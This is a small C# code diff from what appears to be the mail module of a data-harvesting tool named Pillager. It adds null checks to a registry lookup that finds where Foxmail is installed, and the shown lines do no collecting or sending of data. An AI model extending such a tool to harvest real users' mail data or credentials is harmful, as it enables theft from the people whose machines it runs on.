@@ -15,8 +15,8 @@ namespace Pillager.Mails
         {
             try
             {
-                string foxPath = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command").GetValue("").ToString();
-                foxPath = foxPath.Remove(foxPath.LastIndexOf("Foxmail.exe", StringComparison.Ordinal)).Replace("\"", "");
+                string foxPath = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command")?.GetValue("").ToString();
+                foxPath = foxPath?.Remove(foxPath.LastIndexOf("Foxmail.exe", StringComparison.Ordinal)).Replace("\"", "");
                 return foxPath;
             }
             catch { return ""; }            
